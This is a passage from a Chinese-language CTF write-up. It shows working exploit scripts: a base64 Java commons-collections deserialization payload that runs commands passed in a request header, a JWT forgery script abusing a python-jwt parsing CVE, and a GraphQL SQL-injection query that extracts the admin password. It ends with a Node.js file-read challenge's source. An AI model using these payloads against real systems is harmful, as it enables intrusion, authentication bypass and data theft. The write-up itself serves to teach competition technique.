&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python上传，这里其实也卡了很久，直接上传的时候直接回显500然后再去请求头添加cmd之后并没有执行，感觉是没有成功，直到后来在自己测试的时候直接data和headers一起传发现居然成功了，不是很能理解（还是太菜了</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://39.106.13.71:18962/myTest&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHBwdAAObmV3VHJhbnNmb3JtZXJwdwQAAAADc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3NxAH4AC0wABV9uYW1lcQB+AApMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADnPK/rq+AAAANAC5CgAvAF8KAGAAYQoAYABiCABjCgBkAGUIAGYHAGcKAAcAaAcAaQoAagBrCABsCABtCABuCABvCABNCgAHAHAIAHEIAE4HAHIKAGoAcwgAUAgAdAoAdQB2CgATAHcIAHgKABMAeQgAeggAewoAEwB8CAB9CAB+CAB/CACACgAJAIEIAIIHAIMKAIQAhQoAhACGCgCHAIgKACQAiQgAigoAJACLCgAkAIwIAI0IAI4HAI8HAJABAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIkx5c29zZXJpYWwvcGF5bG9hZHMvZXZpbC9FdmlsVGVzdDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQABYwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABbQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAm0xAQAEcmVzcAEAA3JlcQEACWdldFdyaXRlcgEACWdldEhlYWRlcgEABndyaXRlcgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbW1hbmRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2NoYXJzZXROYW1lAQANU3RhY2tNYXBUYWJsZQcAjwcAZwcAkgcAaQcAcgcAUwcAkwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDABCAEMHAJQMAJUAlgwAlwCYAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyBwCZDACaAJsBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAD2phdmEvbGFuZy9DbGFzcwwAnACdAQAQamF2YS9sYW5nL09iamVjdAcAkgwAngCfAQBAb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlNlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwEAC2dldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlDACgAJ0BACVqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXF1ZXN0AQAQamF2YS9sYW5nL1N0cmluZwwAoQCiAQAHb3MubmFtZQcAowwApAClDACmAKcBAAZ3aW5kb3cMAKgAqQEAA0dCSwEABVVURi04DACqAKcBAANXSU4BAAIvYwEABy9iaW4vc2gBAAItYwwAqwCsAQAHcHJpbnRsbgEAEWphdmEvdXRpbC9TY2FubmVyBwCtDACuAK8MALAAsQcAsgwAswC0DABCALUBAAJcQQwAtgC3DAC4AKcBAAVmbHVzaAEABWNsb3NlAQAgeXNvc2VyaWFsL3BheWxvYWRzL2V2aWwvRXZpbFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAt0b1VwcGVyQ2FzZQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAAhAC4ALwAAAAAAAwABADAAMQACADIAAAA/AAAAAwAAAAGxAAAAAgAzAAAABgABAAAAEQA0AAAAIAADAAAAAQA1ADYAAAAAAAEANwA4AAEAAAABADkAOgACADsAAAAEAAEAPAABADAAPQACADIAAABJAAAABAAAAAGxAAAAAgAzAAAABgABAAAAFgA0AAAAKgAEAAAAAQA1ADYAAAAAAAEANwA4AAEAAAABAD4APwACAAAAAQBAAEEAAwA7AAAABAABADwAAQBCAEMAAgAyAAACwwAJAA0AAAF7KrcAAbgAArYAAxIEtgAFTCsSBgO9AAe2AAhNLAEDvQAJtgAKTrgAArYAAxILtgAFTCsSDAO9AAe2AAhNKxINA70AB7YACDoELC0DvQAJtgAKOgUZBC0DvQAJtgAKOga4AAK2AAMSDrYABRIPA70AB7YAEDoHuAACtgADEhG2AAUSEgS9AAdZAxITU7YAEDoIGQgEtgAUGQcEtgAUGQcZBQO9AAm2AAo6CRkIGQYEvQAJWQMSFVO2AArAABM6Cga9ABM6CxIWuAAXtgAYEhm2ABqZAAgSG6cABRIcOgwSFrgAF7YAHRIetgAamQASGQsDEhVTGQsEEh9TpwAPGQsDEiBTGQsEEiFTGQsFGQpTGQm2ACISIwS9AAdZAxITU7YAEBkJBL0ACVkDuwAkWbgAJRkLtgAmtgAnGQy3ACgSKbYAKrYAK1O2AApXGQm2ACISLAO9AAe2ABAZCQO9AAm2AApXGQm2ACISLQO9AAe2ABAZCQO9AAm2AApXsQAAAAMAMwAAAG4AGwAAABcABAAaABAAGwAbABwAJQAdADEAHgA8AB8ASAAgAFMAIQBfACIAdQAjAJAAJACWACUAnAAmAKkAJwC+ACgAxAApAN0AKgDtACsA8wAsAPwALgECAC8BCAAxAQ4AMgFKADMBYgA0AXoANQA0AAAAhAANAAABewA1ADYAAAAQAWsARABFAAEAGwFgAEYARwACACUBVgBIAEkAAwBIATMASgBHAAQAUwEoAEsASQAFAF8BHABMAEkABgB1AQYATQBHAAcAkADrAE4ARwAIAKkA0gBPAEkACQC+AL0AUABRAAoAxAC3AFIAUwALAN0AngBUAFEADABVAAAAOAAE/wDZAAwHAFYHAFcHAFgHAFkHAFgHAFkHAFkHAFgHAFgHAFkHAFoHAFsAAEEHAFr8ACAHAFoLADsAAAAEAAEAXAABAF0AAAACAF5wdAAFYW1ldXVwdwEAeHEAfgAReA==&#x27;</span></span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(requests.post(<span class="string">&#x27;http://39.106.13.71:18962/myTest&#x27;</span>, data=data, headers=&#123;<span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;cat /flag&#x27;</span>&#125;).text)</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18e4ba5e-7907-44f2-baba-2ac04b6787b4&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FunWEB"><a href="#FunWEB" class="headerlink" title="FunWEB"></a>FunWEB</h3><ul>
<li>flask python-jwt</li>
</ul>
<p>直接打开是登录注册界面，猜测可能有SQL注入，就是不知道环境是什么，先注册一个账号进去，发现有三个路由getFlag、graphql、logout</p>
<p>但是前面两个都需要admin登录，查看cookie发现有session和token，session是flask session，强行解密发现只是用来记录是否登录的。而token是jwt，会记录是不是admin，那么如果想成为admin那就是要找到秘钥了，但是完全没有思路该怎么去找到秘钥，打算从JWT攻击入手</p>
<p>把token放到jwt.io上看，发现是PS256加密，是非对称加密……</p>
<p>之后就卡了很久很久，甚至还成改成对称加密去爆破秘钥……</p>
<p><img src="https://img-blog.csdnimg.cn/12808644c7c64114b68a497f09118316.png" alt="Untitled"></p>
<p>python环境下的jwt，google到了<a href="https://github.com/davedoesdev/python-jwt">https://github.com/davedoesdev/python-jwt</a>，可以发现近期刚出一个CVE，还是关于token认证的，那这次的考点应该就是这里了</p>
<p><img src="https://img-blog.csdnimg.cn/f40d965eccdf4d7c9a05460af661ad7c.png" alt="Untitled"></p>
<p>直接查看详情，可以发现漏洞点是JWT解析器和jwtcrypto依赖不一致造成的，但还是有点不知道该怎么入手，</p>
<p><img src="https://img-blog.csdnimg.cn/61171b5c778e4b9c9b50b6721581ac7d.png" alt="Untitled"></p>
<p>查看commit，在最后有一个<code>vulnerability_vows.py</code> ，仔细审计一下可以发现这个就是用来测试漏洞是否修复成功的，那从另一方面来说我们就可以利用这和脚本伪造token</p>
<p><img src="https://img-blog.csdnimg.cn/48e495a6808e435eba0f43cae850d21d.png" alt="Untitled"></p>
<p>直接将整个最新版的python-jwt从github上面拿下来，利用里面的test包构造exp，然后在环境里面安装python-jwt3.3.3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> fixtures <span class="keyword">import</span> generated_keys</span><br><span class="line"><span class="keyword">import</span> python_jwt <span class="keyword">as</span> jwt</span><br><span class="line"><span class="comment"># from pyvows import Vows, expect</span></span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fakePayload</span>(<span class="params">topic</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print(topic)</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">2000000000</span></span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zef45s04koksrnwzpys.cloudeci1.ichunqiu.com/&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMjQ2ODksImlhdCI6MTY2NzEyNDM4OSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJDSFNEemZIbHJpcTJZbmU3Ynhrc2lRIiwibmJmIjoxNjY3MTI0Mzg5LCJwYXNzd29yZCI6ImFtZXV1IiwidXNlcm5hbWUiOiJhbWV1dSJ9.nlAxl5xunioWsD7UkEY35CGu69F9JMI3B4tCTI5zG-HH5XxbgJIDjheBgYH83QOs7wuu7nRWnuzBGBvXZpoTdjXDklD8ob69-Z9h0UvYB8J9_AwySCssHOw_2d2w4B4EmhTsZ0JXv78KOgIIYKZeI4mX3RohGceGGTMLw92KW0V4IGaZulLXBl9HWw0qfnwXEOY0vNmbofCu3i_Ee1v0m6NWF2ytrLwspkJ59Xj09FXG2oEPzRC-Mx4RBgm5b2xX66RNJcwJhqiwAeRLJ3of0kr5Oo2-3VIjpNUsxgcEUUojk561CT0Lj3NO4kzfJ88gbQwnZ4f-gcg2Kg7IbVa7Tg&#x27;</span></span><br><span class="line">token = fakePayload(a)</span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getflag&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">                           <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>回显<code>only currect password can readflag</code> ，说明我们得拿到flag，而还有一个查看成绩的graphql路由可以进行grqphql注入</p>
<p><a href="https://www.secpulse.com/archives/148242.html#:~:text=graphql%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%B8%80%E8%88%AC%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E4%BC%BC%EF%BC%8C%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E8%AF%AD%E5%8F%A5%E8%BE%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E6%88%96%E6%94%B9%E5%8F%98%E6%9F%A5%E8%AF%A2%E9%80%BB%E8%BE%91%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82,p%E7%A5%9E%E5%9C%A8%E5%85%88%E7%9F%A5%E5%A4%A7%E4%BC%9A%E4%B8%8A%E8%AE%B2%E8%BF%87%E8%AF%A5%E7%B1%BB%E9%97%AE%E9%A2%98%EF%BC%8C%E5%80%9F%E7%94%A8p%E7%A5%9E%E7%9A%842%E5%BC%A0PPT%E3%80%82">https://www.secpulse.com/archives/148242.html</a></p>
<p><a href="https://graphql.cn/learn/queries/#variables">https://graphql.cn/learn/queries/#variables</a></p>
<p>graphql注入查询到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;__type&#x27;: &#123;&#x27;name&#x27;: &#x27;Getscorebyid&#x27;, &#x27;fields&#x27;: [&#123;&#x27;name&#x27;: &#x27;score&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;name&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;id&#x27;&#125;]&#125;&#125;</span><br><span class="line">&#123;&#x27;__type&#x27;: &#123;&#x27;name&#x27;: &#x27;Getscorebyname&#x27;, &#x27;fields&#x27;: [&#123;&#x27;name&#x27;: &#x27;score&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;name&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;userid&#x27;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> fixtures <span class="keyword">import</span> generated_keys</span><br><span class="line"><span class="keyword">import</span> python_jwt <span class="keyword">as</span> jwt</span><br><span class="line"><span class="comment"># from pyvows import Vows, expect</span></span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fakePayload</span>(<span class="params">topic</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print(topic)</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&quot;i2Ip4m1Jx3iWMbtVRywc&quot;</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">2000000000</span></span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zef45s04koksrnwzpys.cloudeci1.ichunqiu.com/&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMjQ2ODksImlhdCI6MTY2NzEyNDM4OSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJDSFNEemZIbHJpcTJZbmU3Ynhrc2lRIiwibmJmIjoxNjY3MTI0Mzg5LCJwYXNzd29yZCI6ImFtZXV1IiwidXNlcm5hbWUiOiJhbWV1dSJ9.nlAxl5xunioWsD7UkEY35CGu69F9JMI3B4tCTI5zG-HH5XxbgJIDjheBgYH83QOs7wuu7nRWnuzBGBvXZpoTdjXDklD8ob69-Z9h0UvYB8J9_AwySCssHOw_2d2w4B4EmhTsZ0JXv78KOgIIYKZeI4mX3RohGceGGTMLw92KW0V4IGaZulLXBl9HWw0qfnwXEOY0vNmbofCu3i_Ee1v0m6NWF2ytrLwspkJ59Xj09FXG2oEPzRC-Mx4RBgm5b2xX66RNJcwJhqiwAeRLJ3of0kr5Oo2-3VIjpNUsxgcEUUojk561CT0Lj3NO4kzfJ88gbQwnZ4f-gcg2Kg7IbVa7Tg&#x27;</span></span><br><span class="line">token = fakePayload(a)</span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; __schema&#123; types &#123; name &#125; &#125; &#125;&#x27;&#125;</span></span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; __type(name: &quot;__EnumValue&quot;) &#123; name fields &#123; name type &#123; name kind ofType &#123; name kind &#125; &#125; &#125; &#125; &#125;&#x27;&#125;</span></span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; __fields(name: &quot;getscoreusingnamehahaha&quot;)  &#123; name &#125;  &#125;&#x27;&#125;</span></span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; Getscorebyname(name: &quot;admin&quot;)&#123; userid name score &#125; &#125;&#x27;&#125;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;query&#x27;</span>: <span class="string">&#x27;&#123; getscoreusingnamehahaha(name:&quot;name\&#x27;union select password from users where name=\&#x27;admin\&#x27; and \&#x27;1=1&quot;)&#123; userid name score &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;&#125; &#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url + <span class="string">&#x27;graphql&#x27;</span>,</span><br><span class="line">                  cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">                           <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k&#x27;</span>&#125;,</span><br><span class="line">                  data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getflag&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">                           <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;9f065df3-23ae-438f-ae09-56d36a400b52&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RustWaf"><a href="#RustWaf" class="headerlink" title="RustWaf"></a>RustWaf</h3><p><code>/src</code>得到nodejs源代码</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line">app.use(bodyParser.text(&#123;<span class="attr">type</span>: <span class="string">&#x27;*/*&#x27;</span>&#125;));</span><br><span class="line"><span class="keyword">const</span> &#123;  execFileSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/readfile&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> body = req.body.toString();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;bosy = &quot;</span>+body + <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> file_to_read = <span class="string">&quot;app.js&quot;</span>;</span><br><span class="line">     <span class="keyword">const</span> file = execFileSync(<span class="string">&#x27;/app/rust-waf&#x27;</span>, [body], &#123;</span><br><span class="line">         <span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">     &#125;).trim();</span><br><span class="line">    <span class="keyword">const</span> file = body;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        file_to_read = <span class="built_in">JSON</span>.parse(file)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">        file_to_read = file</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;file_to_read = &quot;</span> + file_to_read + <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> data = fs.readFileSync(file_to_read);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;data = &quot;</span> + data);</span><br><span class="line">    <span class="comment">// res.send(data.toString());</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&#x27;see `/src`&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/src&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>);</span><br><span class="line">    res.send(data.toString());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码比较简单，重点就是在<code>/readfile</code>目录下读取文件，而会直接从post body获取文件名，直接用bp传，测试读取<code>app.js</code>成功</p>
<p><img src="https://img-blog.csdnimg.cn/4fde64a0c7c6406f91c0b7f76d7d38fe.png" alt="Untitled"></p>
<p>但是读取<code>/flag</code>的时候没有成功，返回了rust的代码。可以发现如果payload中包含flag或者proc就会直接返回文件内容，如果绕过了再判断payload如果是json格式，那么是否存在key为<code>protocol</code>，如果存在也直接返回文件内容</p>
